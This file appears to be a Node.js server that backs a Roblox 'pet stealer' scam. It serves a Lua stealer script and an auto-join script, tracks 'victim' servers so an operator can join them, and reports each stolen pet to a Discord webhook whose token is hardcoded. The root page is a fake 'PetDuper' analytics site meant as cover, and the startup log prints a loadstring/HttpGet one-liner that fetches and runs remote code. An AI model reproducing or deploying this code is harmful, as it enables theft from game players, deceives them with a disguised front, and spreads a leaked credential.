
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Discord webhook URL
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1325765386238562327/eq2myv5HzzanELHVxPS7My4DLDuMJmpWgGet5zatQ8T0FgTOdj8yOsiATV_92NkzaDTy';

// Middleware for JSON parsing
app.use(express.json());

// Enable CORS for all routes
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// Serve the Lua script
app.get('/script', (req, res) => {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  
  try {
    const scriptPath = path.join(__dirname, 'pet-stealer.lua');
    const scriptContent = fs.readFileSync(scriptPath, 'utf8');
    res.send(scriptContent);
    console.log('Served pet-stealer.lua script');
  } catch (error) {
    console.error('Error reading Lua script:', error);
    res.status(500).send('-- Error loading script');
  }
});

// Alternative endpoint for raw script
app.get('/raw', (req, res) => {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  
  try {
    const scriptPath = path.join(__dirname, 'pet-stealer.lua');
    const scriptContent = fs.readFileSync(scriptPath, 'utf8');
    res.send(scriptContent);
    console.log('Served pet-stealer.lua script via /raw');
  } catch (error) {
    console.error('Error reading Lua script:', error);
    res.status(500).send('-- Error loading script');
  }
});

// Serve the Allabove26 auto-join script
app.get('/allabove26-autojoin.lua', (req, res) => {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  
  try {
    const scriptPath = path.join(__dirname, 'allabove26-autojoin.lua');
    const scriptContent = fs.readFileSync(scriptPath, 'utf8');
    res.send(scriptContent);
    console.log('Served allabove26-autojoin.lua script');
  } catch (error) {
    console.error('Error reading auto-join script:', error);
    res.status(500).send('-- Error loading auto-join script');
  }
});

// Store waiting victims
let waitingVictims = [];

// Endpoint for victims to report their server
app.post('/victim-server', (req, res) => {
  try {
    const serverData = req.body;
    console.log('Victim server reported:', serverData.victimUsername);
    
    // Add to waiting victims list
    waitingVictims.push({
      ...serverData,
      reportedAt: Date.now()
    });
    
    // Remove old entries (older than 10 minutes)
    const tenMinutesAgo = Date.now() - (10 * 60 * 1000);
    waitingVictims = waitingVictims.filter(victim => victim.reportedAt > tenMinutesAgo);
    
    res.status(200).json({ success: true, message: 'Server location recorded' });
  } catch (error) {
    console.error('Error recording victim server:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Endpoint for Allabove26 to get waiting victims
app.get('/get-victim-servers', (req, res) => {
  try {
    // Remove old entries
    const tenMinutesAgo = Date.now() - (10 * 60 * 1000);
    waitingVictims = waitingVictims.filter(victim => victim.reportedAt > tenMinutesAgo);
    
    res.status(200).json({ victims: waitingVictims });
  } catch (error) {
    console.error('Error getting victim servers:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Pet theft logging endpoint
app.post('/log-pet-theft', async (req, res) => {
  try {
    const petData = req.body;
    console.log('Pet theft logged:', petData);

    // Create rich Discord embed for pet theft
    const embed = {
      embeds: [{
        title: "🐾 **PET STOLEN SUCCESSFULLY**",
        color: 0xFF0000,
        thumbnail: {
          url: "https://cdn.discordapp.com/emojis/1234567890123456789.png" // Pet emoji
        },
        fields: [
          {
            name: "🎯 **Pet Name**",
            value: petData.petName || "Unknown Pet",
            inline: true
          },
          {
            name: "💎 **Rarity**", 
            value: petData.petRarity || "Common",
            inline: true
          },
          {
            name: "💰 **Value**",
            value: petData.petValue?.toString() || "0",
            inline: true
          },
          {
            name: "👤 **Stolen From**",
            value: petData.fromPlayer || "Unknown Player",
            inline: true
          },
          {
            name: "🎁 **Sent To**",
            value: petData.toPlayer || "Unknown Target",
            inline: true
          },
          {
            name: "🎮 **Game**",
            value: petData.game || "Unknown Game",
            inline: true
          },
          {
            name: "🆔 **Place ID**",
            value: petData.placeId?.toString() || "Unknown",
            inline: true
          },
          {
            name: "⏰ **Timestamp**",
            value: petData.timestamp || new Date().toISOString(),
            inline: true
          },
          {
            name: "✅ **Status**",
            value: "Pet Successfully Transferred",
            inline: false
          }
        ],
        footer: {
          text: "🔥 Pet Stealer Script v1.0 | Made by SL4A"
        },
        timestamp: new Date().toISOString()
      }]
    };

    // Send to Discord webhook
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(embed)
    });

    if (response.ok) {
      console.log('Pet theft successfully logged to Discord');
      res.status(200).json({ success: true });
    } else {
      console.error('Failed to send to Discord:', response.status);
      res.status(500).json({ error: 'Failed to send to Discord' });
    }

  } catch (error) {
    console.error('Error logging pet theft:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    service: 'Lua Script Server',
    timestamp: new Date().toISOString() 
  });
});

// Root endpoint with legitimate-looking service info
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>PetDuper - Pet Management API</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
            .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .header { text-align: center; margin-bottom: 30px; }
            .logo { font-size: 32px; font-weight: bold; color: #2c3e50; margin-bottom: 10px; }
            .tagline { color: #7f8c8d; font-size: 18px; }
            .section { margin: 25px 0; }
            .section h3 { color: #34495e; border-bottom: 2px solid #3498db; padding-bottom: 5px; }
            .feature { background: #ecf0f1; padding: 15px; margin: 10px 0; border-radius: 5px; }
            .footer { text-align: center; margin-top: 40px; color: #95a5a6; font-size: 14px; }
            .status { background: #2ecc71; color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="logo">🐾 PetDuper</div>
                <div class="tagline">Advanced Pet Management & Analytics Platform</div>
                <span class="status">Service Active</span>
            </div>
            
            <div class="section">
                <h3>📊 About Our Service</h3>
                <p>PetDuper provides enterprise-grade pet management solutions for gaming platforms. Our robust API handles pet analytics, inventory management, and automated trading systems.</p>
            </div>
            
            <div class="section">
                <h3>🚀 Features</h3>
                <div class="feature">
                    <strong>Pet Analytics:</strong> Real-time tracking and value assessment for virtual pets
                </div>
                <div class="feature">
                    <strong>Inventory Management:</strong> Automated pet organization and cataloging
                </div>
                <div class="feature">
                    <strong>Trading Systems:</strong> Secure peer-to-peer pet exchange protocols
                </div>
                <div class="feature">
                    <strong>Discord Integration:</strong> Seamless logging and notification systems
                </div>
            </div>
            
            <div class="section">
                <h3>🔧 API Endpoints</h3>
                <p><strong>GET /script</strong> - Pet management client library</p>
                <p><strong>POST /analytics</strong> - Submit pet analytics data</p>
                <p><strong>GET /health</strong> - Service status monitoring</p>
            </div>
            
            <div class="footer">
                <p>© 2024 PetDuper Analytics Platform | Serving gaming communities worldwide</p>
                <p>Last updated: ${new Date().toLocaleDateString()}</p>
            </div>
        </div>
    </body>
    </html>
  `);
});

// Start the server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Lua Script Server running on port ${PORT}`);
  console.log(`Script available at: http://0.0.0.0:${PORT}/script`);
  console.log(`Usage: loadstring(game:HttpGet("https://pet-duper.zeabur.app/script"))()`);
});
